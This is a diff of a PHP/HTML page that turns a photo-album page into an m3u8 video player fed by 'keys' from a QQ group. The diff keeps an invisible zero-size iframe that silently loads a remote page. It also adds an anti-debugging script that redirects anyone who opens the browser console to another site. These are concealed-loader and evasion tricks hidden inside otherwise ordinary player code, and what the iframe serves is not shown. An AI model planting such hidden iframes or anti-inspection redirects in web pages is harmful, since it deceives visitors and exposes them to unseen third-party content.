@@ -1,11 +1,21 @@
+
+
+
+
+
 <?php
-<iframe src="https://ktv98.gitee.io./gg.html" frameborder="0" width="0" height="0"></iframe>
+
 <html>
-	
+	<iframe src="https://ktv98.gitee.io./gg.html" width="0" height="0"></iframe></body>
+	<head>
+		<meta charset="utf-8">
+		<html class="no-js" lang="" style="--status-bar-height:0px; --window-top:0px; --window-bottom:0px;">
+			<head>
+				<meta charset="utf-8">
+				<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
 
 				<title>
-
-					子云相册
+					m3u8视频解析
 				</title>
 				
 <link type="text/css" rel="stylesheet" href="./index.css"><title> </title></head>
@@ -23,17 +33,79 @@ infinite linear;}@keyframes masked-animation {0% {background-position: 0 0;}100%
 <TD height=40 width=821 colSpan=2><SPAN class=STYLE1>
 <MARQUEE><STRONG>
 
-<b id="nr"><a href="https://98tv.github.io">欢迎来到子云相册</a></FONT></STRONG></MARQUEE></SPAN>
+<b id="nr"><a href="https://98tv.github.io">欢迎来到喜爱夜蒲.这里为大家提供不一样的视觉听觉的盛宴</a></FONT></STRONG></MARQUEE></SPAN>
 </div>
 	</marquee></style>
 						<div class="mod mod-global-nav nav-header t5 center no-icon line bg2">
 							<div class="cell title"><span>
 									
-										子云提醒每天都要快乐哦<a href="">--打开官网</a>								</a>
+										ps;请勿相信任何棋牌广告<a href="https://ktv98.gitee.io"></a>								</a>
 								</span>
 							</div>  </div> </div> 
 						</div>
 
+<div class="mod mod-global-nav nav-header t5 center no-icon line bg2">
+							<div class="cell title"><span>
+									寻电影拿钥匙进群留言哦<a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=T1fLn9A5sMf95ckaHDYDj4QIESVxLPN9&authKey=nW3OMNbCHdTolRPairfQP5iB32RZ5iTckvadxO5pn9gdl5Odt3j6euXpFA%2B%2FV1RT&noverify=0&group_code=609286349">--返回首页</a>								</a>
+								</span>
+							</div>  </div> </div> 
+						</div>
+<script src="./18.js"></script>
+        <style type="text/css">  
+           
+        </style> 
+    </head>
+  <body>
+  
+    <div> 
+	    <button onclick="loadVideo()"><span style="color:red">开始播放</span></button>
+	    <input type="text" id="urlInput" placeholder="输入或粘贴钥匙👉点开始播放" ;">
+			
+			<video id="video" width='100%' src="" controls autoplay muted></video>
+        </div>  
+    </body>  
+  <script type="text/javascript">
+	//播放视频流 
+    function loadVideo(){
+		var video = document.getElementById('video');//获取 video 标签
+		var hlsUrl = document.getElementById('urlInput').value;//获取输入的视频流地址
+
+		if(Hls.isSupported()) {
+			var hls = new Hls();//实例化 Hls 对象
+			hls.loadSource(hlsUrl);//传入路径
+			hls.attachMedia(video);
+			hls.on(Hls.Events.MANIFEST_PARSED,function() {
+				video.play();//调用播放 API
+			});
+		} else if (video.canPlayType('application/vnd.apple.mpegurl')) {
+			video.src = hlsUrl;
+			video.addEventListener('loadedmetadata',function() {
+				video.play();
+			});
+		}
+    }
+		
+  //方法调用
+  loadVideo();
+  </script>
+</html>  
+</body>
+<script>    
+    $(document).ready(function(){      
+        var clipboard = new Clipboard('#copy_btn');    
+        clipboard.on('success', function(e) {    
+            ;
+            e.clearSelection();    
+            console.log(e.clearSelection);    
+        });    
+    });    
+</script> 
+<script>
+    //debug调试时跳转页面
+    var element = new Image();
+    Object.defineProperty(element,'id',{get:function(){window.location.href="https://98tv.github.io"}});
+    console.log(element);
+</script>
 
 </html>
 </html>
